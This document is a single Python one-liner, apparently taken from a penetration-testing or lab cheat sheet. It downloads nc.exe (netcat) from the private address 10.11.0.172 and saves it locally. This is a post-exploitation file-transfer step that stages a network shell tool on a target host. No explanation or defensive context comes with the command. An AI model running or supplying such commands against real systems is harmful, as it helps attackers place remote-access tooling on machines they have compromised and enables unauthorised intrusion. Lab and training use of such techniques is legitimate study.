python -c 'import urllib2; u = urllib2.urlopen("http://10.11.0.172/nc.exe"); localFile = open("download_via_python", "w"); localFile.write(u.read()); localFile.close()'
